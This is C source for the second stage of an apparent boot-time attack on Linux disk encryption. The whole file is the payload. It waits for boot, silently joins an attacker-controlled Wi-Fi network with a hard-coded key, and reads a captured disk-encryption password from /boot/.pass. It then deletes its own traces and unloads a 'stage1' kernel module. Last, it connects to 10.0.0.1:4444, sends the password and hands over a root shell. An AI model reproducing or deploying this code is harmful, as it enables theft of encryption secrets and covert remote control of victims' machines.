/* (in)secure booting linux
 * Angel Suarez-B Martin (n0w)
 * stage2 - payload
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define NMCLI /usr/bin/nmcli

// execve wrapper from http://stackoverflow.com/questions/5237482/how-do-i-execute-external-program-within-c-code-in-linux-with-arguments
static int exec_prog(const char **argv)
{
    pid_t   my_pid;
    int     status, timeout /* unused ifdef WAIT_FOR_COMPLETION */;

    if (0 == (my_pid = fork())) {
            if (-1 == execve(argv[0], (char **)argv , NULL)) {
                    perror("child process execve failed [%m]");
                    return -1;
            }
    }

#ifdef WAIT_FOR_COMPLETION
    timeout = 1000;

    while (0 == waitpid(my_pid , &status , WNOHANG)) {
            if ( --timeout < 0 ) {
                    perror("timeout");
                    return -1;
            }
            sleep(1);
    }

    printf("%s WEXITSTATUS %d WIFEXITED %d [status %d]\n",
            argv[0], WEXITSTATUS(status), WIFEXITED(status), status);

    if (1 != WIFEXITED(status) || 0 != WEXITSTATUS(status)) {
            perror("%s failed, halt system");
            return -1;
    }

#endif
    return 0;
}

// sends disk encryption password through socket, then binds root shell
void bindShell(char* destIP, int destPort, char* diskPass)
{
  int sockfd = 0, n = 0;
  struct sockaddr_in serv_addr;
  const char greeting[] = "nn5ed - (in)secure booting linux\n================================\n";
  const char passwordText[] = "[+] Contraseña cifrado de disco:";
  const char byeText[] = "\n[+] Shell remota establecida.\n> ";
  
  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  {
    printf("\n Error : Could not create socket \n");
    return;
  } 

  memset(&serv_addr, '0', sizeof(serv_addr)); 

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(destPort); 

  if(inet_pton(AF_INET, destIP, &serv_addr.sin_addr)<=0)
  {
    printf("\n inet_pton error occured\n");
    return;
  } 

  if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
  {
  printf("\n Error : Connect Failed \n");
  return;
  } 

  send(sockfd, greeting, sizeof(greeting), 0);
  send(sockfd, passwordText, sizeof(passwordText), 0);
  send(sockfd, diskPass, sizeof(diskPass), 0);
  send(sockfd, byeText, sizeof(byeText), 0);
  
  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  execve("/bin/sh", NULL, NULL);
  return;
}

// waits for the system to be in runlevel 5
void waitForBoot()
{
  FILE *fp = NULL;
  char buff[10];
  
  while (!fp)
    fp = popen("/sbin/runlevel", "r");
  
  fgets(buff, sizeof(buff)-1, fp);
  
  while (strncmp(buff, "N 5", 3))
    sleep(1);
}

// nmcli wrapper
void nmWrapper(int mode)
{
  int rc = 0;
  char status = 0;
  FILE* fd;
  
  const char* turnWifiOn[] = {"/usr/bin/nmcli", "radio", "wifi", "on", NULL};
  const char* turnWifiOff[] = {"/usr/bin/nmcli", "radio", "wifi", "off", NULL};
  const char* listNetworks[] = {"/usr/bin/nmcli", "-f", "SSID", "dev", "wifi", "list", NULL};
  const char* addConnection[] = {"/usr/bin/nmcli", "con", "add", "con-name", "nn5ed", "type", "wifi", "ifname", "wlan0", "ssid", "nn5ed_ibl", NULL};
  const char* delConnection[] = {"/usr/bin/nmcli", "con", "del", "nn5ed", NULL};
  const char* modConnection[] = {"/usr/bin/nmcli", "con", "modify", "nn5ed", "wifi-sec.key-mgmt", "wpa-psk", NULL};
  const char* addPasswd[] = {"/usr/bin/nmcli", "con", "modify", "nn5ed", "wifi-sec.psk", "aa88aa88aa88", NULL};
  const char* connectivityCheck[] = {"/usr/bin/nmcli", "networking", "connectivity", "check", NULL};
  
  //mode == 1 connect
  //mode == 0 disconnect
  if (mode)
  {
    rc = exec_prog(turnWifiOff);
    rc = exec_prog(addConnection);
    sleep(1);
    rc = exec_prog(modConnection);
    sleep(1);
    rc = exec_prog(addPasswd);
    sleep(1);
    rc = exec_prog(turnWifiOn);

    //wait for network
    while (status != '1')
    {
      fd = fopen("/sys/class/net/wlan0/carrier", "r");
      status = fgetc(fd);
      fclose(fd);
      sleep(1);
    }
  }
  else
  {
    rc = exec_prog(delConnection);
  }  
}

// gets password from file
char* getPasswd()
{
  FILE* fd;
  char* passwd = NULL;
  size_t len = 0;
  ssize_t read;
  
  fd = fopen("/boot/.pass", "r");
  getline(&passwd, &len, fd);
  fclose(fd);
  
  return passwd;
}


int main()
{
  waitForBoot();
  nmWrapper(1);
  
  // Get password from disk
  char* passwd = getPasswd();
  
  // Clean up
  remove("/boot/.pass");
  remove("/boot/.stage2");
  system("rmmod stage1");
  
  // Finally, bind shell
  bindShell("10.0.0.1", 4444, passwd);
  
  free(passwd);
  return 0;
}
